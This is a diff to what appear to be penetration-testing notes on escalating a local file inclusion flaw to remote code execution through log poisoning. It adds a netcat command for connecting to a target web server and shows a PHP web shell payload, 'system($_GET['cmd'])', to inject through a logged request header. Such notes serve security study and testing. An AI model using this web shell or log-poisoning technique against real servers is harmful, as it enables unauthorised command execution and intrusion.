@@ -12,6 +12,8 @@ If you locate an LFI, first try to get RCE.
 
 Inject a simple web shell payload into a request header (e.g., User-Agent or Referer) that the web server will log.
 
+    nc -nv IP 80
+
 Payload:
 
     <?php echo system($_GET['cmd']); ?>
